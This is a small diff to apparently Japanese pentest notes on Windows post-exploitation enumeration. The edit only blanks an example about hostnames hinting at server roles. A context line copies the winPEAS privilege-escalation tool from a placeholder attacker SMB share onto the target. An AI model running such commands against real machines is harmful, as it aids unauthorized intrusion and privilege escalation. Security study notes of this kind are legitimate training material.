@@ -82,7 +82,7 @@ cp \\<AttackerIP>\share\winPEASx64.exe .
 whoami
 ```
 - ホスト名：そのマシンの役割や種別を示すことが多い
-	- 例：WEB01＝webサーバー、MSSQL01＝MSSQLサーバー
+	-
 
 現在のユーザーが所属するグループ
 ```powershell
